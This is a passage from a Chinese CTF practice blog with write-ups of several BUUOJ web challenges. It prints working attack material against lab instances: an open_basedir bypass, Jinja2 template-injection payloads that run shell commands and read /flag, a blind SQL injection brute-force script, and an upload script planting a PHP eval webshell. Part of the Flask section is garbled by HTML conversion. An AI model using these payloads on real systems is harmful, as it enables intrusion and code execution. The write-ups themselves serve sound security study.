这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。

```
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));
```

[![image-20220210214135619](ctf刷题-第一周题目/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)

所有文件被列举出来了，下面读取flag值就可以了。

[![image-20220210214447849](ctf刷题-第一周题目/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)

## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 这道题是模板注入。 [![image-20220211102608147](ctf刷题-第一周题目 image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) 首先查看源代码，并没有什么用。 [![image-20220211102910418](ctf刷题-第一周题目 image-20220211102910418.png)](https: image-20220211102910418.png) dirsearch爆破一下，什么也没有。 [![image-20220211102929099](ctf刷题-第一周题目 image-20220211102929099.png)](https: image-20220211102929099.png) 本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。 我们这里采用arjun工具进行爆破。工具链接：https: github.com s0md3v arjun [![image-20220211110028885](ctf刷题-第一周题目 image-20220211110028885.png)](https: image-20220211110028885.png)最终可爆破出来参数name。 [![image-20220211105238512](ctf刷题-第一周题目 image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctf刷题-第一周题目 image-20220211105250064.png)](https: image-20220211105250064.png) 测试了一下的确存在模板注入。 接下来就是对漏洞的利用。 **漏洞利用** **1、工具tplmap** [![image-20220211110242684](ctf刷题-第一周题目 image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctf刷题-第一周题目 image-20220211110254561.png)](https: image-20220211110254561.png) 成功，发现为jinja2模板，在ctf题目中经常考察 直接–os-shell拿下shell，读取flag [![image-20220211110436293](ctf刷题-第一周题目 image-20220211110436293.png)](https: image-20220211110436293.png) **2、手工利用** 只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。 具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。 [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flak框架 ) 首先给几个比较通用的payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctf刷题-第一周题目 image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p>
<p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p>
<p>1、有popen()的类</p>
<pre><code>os._wrap_close
payload:
&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
</code></pre>
<p>2、有os模块的</p>
<p>socket._socketobject（一般在71）、site._Printer等模块</p>
<pre><code>payload:
&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;
</code></pre>
<p>3、有builtins的类</p>
<p>__ builtins __代码执行（最常用的方法）</p>
<p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p>
<p>__ builtins __   是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins   __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__   builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p>
<p>好了，接下来进行实践。</p>
<p>我们把所有子类列出来</p>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p>
<p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p>
<pre><code>import json

a = &quot;&quot;&quot;
&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
&quot;&quot;&quot;

num = 0
allList = []

result = &quot;&quot;
for i in a:
    if i == &quot;&gt;&quot;:
        result += i
        allList.append(result)
        result = &quot;&quot;
    elif i == &quot;\n&quot; or i == &quot;,&quot;:
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if &quot;os._wrap_close&quot; in v:
        print(str(k)+&quot;---&gt;&quot;+v)
</code></pre>
<p>我们先来找下os._wrap_close</p>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p>
<p>已经出来了在132位，那么我们就可以构造一个payload</p>
<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;
</code></pre>
<p>我们来测试一下是否可以</p>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p>
<p>成功列出来了文件。</p>
<p>直接读取flag</p>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p>
<p>同理，可以利用的类还有很多啊，</p>
<p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p>
<p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p>
<p>方法有很多，理解原理并掌握其中几种方法即可。</p>
<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p>
<p>进去以后直接给你了sql语句。</p>
<p>先不管别的扫一下目录再说</p>
<p>发现xxx/robots.txt文件</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p>
<p>再到hin.txt查看<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p>
<p>给出了过滤得字符串，并且说的很明白如果得到admin得密码就可以得到flag，但是这里得过滤是非常严格得。</p>
<p>fuzz一下</p>
<p>发现regexp没有被过滤</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p>
<p>sql语句是</p>
<pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;
</code></pre>
<p>我们可以再username中加反斜杠注释掉单引号</p>
<pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;
</code></pre>
<p>对a进行一个简单得fuzz，判断成功时得响应包</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p>
<p>发现y，响应包是一个302跳转，到welcome.php</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p>
<p>根据这个就可以编写出payload</p>
<pre><code class="python">import time
import requests
import string
from urllib import parse

res = &#39;&#39;
url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;
string = string.digits + string.ascii_lowercase + &#39;_&#39; # 猜测密码由数字，小写字母和下划线组成
for i in range(0, 200):
    for s in string:
        data = &#123;
            &quot;username&quot;: &quot;sakura\\&quot;,
            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))
        &#125;
        response = requests.post(url, data)
        print(response)
        time.sleep(0.5)
        if &quot;welcome&quot; in response.text:
            res = res + s
            print(res)
        else:
            continue
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>进去直接显示这个</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p>
<p>查看源代码，疑似hash长度扩展攻击</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p>
<p>抓取请求包，发现hash值</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p>
<p>直接pass传一下，发现提示文件</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p>
<p>发现文件包含</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p>
<p>扫一下目录</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p>
<p>读取下源码</p>
<p>index.php</p>
<pre><code class="php">&lt;?php
include &#39;config.php&#39;;
@$name=$_GET[&#39;name&#39;];
@$pass=$_GET[&#39;pass&#39;];
if(md5($secret.$name)===$pass)&#123;
    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
           window.location.href=&quot;flflflflag.php&quot;;
    &lt;/script&gt;
&#39;;
&#125;else&#123;
    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);
    echo &quot;username/password error&quot;;
&#125;
?&gt;
&lt;html&gt;
&lt;!--md5($secret.$name)===$pass --&gt;
&lt;/html&gt;
</code></pre>
<p>flflflflag.php</p>
<pre><code class="php">&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
           window.location.href=&quot;404.html&quot;;
&lt;/script&gt;
&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;
&lt;/head&gt;
&lt;&gt;
&lt;body&gt;
&lt;?php
$file=$_GET[&#39;file&#39;];
if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;
    die(&#39;nonono&#39;);
&#125;
@include($file);
echo &#39;include($_GET[&quot;file&quot;])&#39;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>config.php</p>
<pre><code class="php">&lt;?php
$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;
?&gt;
</code></pre>
<p>dir.php</p>
<pre><code class="php">&lt;?php
var_dump(scandir(&#39;/tmp&#39;));
?&gt;
</code></pre>
<p>由于伪协议被过滤，所以我们不能利用伪协议进行写马，这里考察得是php临时文件包含</p>
<p>php7 segment fault特性:<br>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</p>
<p>具体可参阅文章:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p>
<p>payload:</p>
<pre><code>import requests
from io import BytesIO

url = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;
payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;
files = &#123;
    &quot;file&quot;: BytesIO(payload.encode())
&#125;
try:
    requests.post(url=url, files=files, allow_redirects=False)
except:
    print(&quot;false&quot;)
</code></pre>
<p>查看dir.php，成功写入文件</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p>
<p>执行一句话木马，flag在phpinfo中</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p>
<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p>
<p>没有什么发现，尝试访问下secret</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p>
<p>那我就把secret当作参数，传入一个值试一试</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p>
<p>很明显，它把我输入得值进行了一个加密</p>
<p>没有什么发现，随便输入一些字符串，它就爆错了，，，</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p>
<p>寻找可利用的信息</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p>
<p>找到了加密方式是RC4,存在render，应该是模板注入</p>
<p>这是一个RC4加密脚本</p>
<pre><code>import base64
from urllib.parse import quote
def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):
    # print(&quot;RC4加密主函数&quot;)
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt
def rc4_init_sbox(key):
    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
    # print(&quot;原来的 s 盒：%s&quot; % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)
    return s_box
def rc4_excrypt(plain, box):
    # print(&quot;调用加密程序成功。&quot;)
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)
    cipher = &quot;&quot;.join(res)
    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))
    #print(&quot;加密后的输出(经过编码):&quot;)
    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)
</code></pre>
<p>首先列出所有子类</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p>
<p>传给secret</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p>
<p>寻找可利用子类</p>
<p>给出一个脚本</p>
<p>find.py</p>
<pre><code class="python">import json

a = &quot;&quot;&quot;
&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
&quot;&quot;&quot;

num = 0
allList = []

result = &quot;&quot;
for i in a:
    if i == &quot;&gt;&quot;:
        result += i
        allList.append(result)
        result = &quot;&quot;
    elif i == &quot;\n&quot; or i == &quot;,&quot;:
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if &quot;subprocess.Popen&quot; in v:
        print(str(k)+&quot;---&gt;&quot;+v)
</code></pre>
<p>寻找warnings.catch_warnings类</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p>
<p>payload</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/">https://sakurahack-y.github.io/2022/03/28/ctf刷题-第一周题目/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ctf/">ctf</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%97%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">题目列表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B7%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Welcome-to-Earth"><span class="toc-number">2.1.</span> <span class="toc-text">[b01lers2020]Welcome to Earth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">2.2.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">2.3.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown"><span class="toc-number">2.4.</span> <span class="toc-text">[网鼎杯 2020 白虎组]PicDown</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#watevrCTF-2019-Cookie-Store"><span class="toc-number">2.5.</span> <span class="toc-text">[watevrCTF-2019]Cookie Store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">2.6.</span> <span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-CV-Maker"><span class="toc-number">2.7.</span> <span class="toc-text">[WUSTCTF2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">2.8.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell"><span class="toc-number">2.9.</span> <span class="toc-text">[红明谷CTF 2021]write_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasyWeb"><span class="toc-number">2.10.</span> <span class="toc-text">[SUCTF 2019]EasyWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-SQLi"><span class="toc-number">2.11.</span> <span class="toc-text">[NCTF2019]SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ezinclude"><span class="toc-number">2.12.</span> <span class="toc-text">[NPUCTF2020]ezinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret"><span class="toc-number">2.13.</span> <span class="toc-text">[CISCN2019 华东南赛区]Double Secret</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">html学习笔记 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>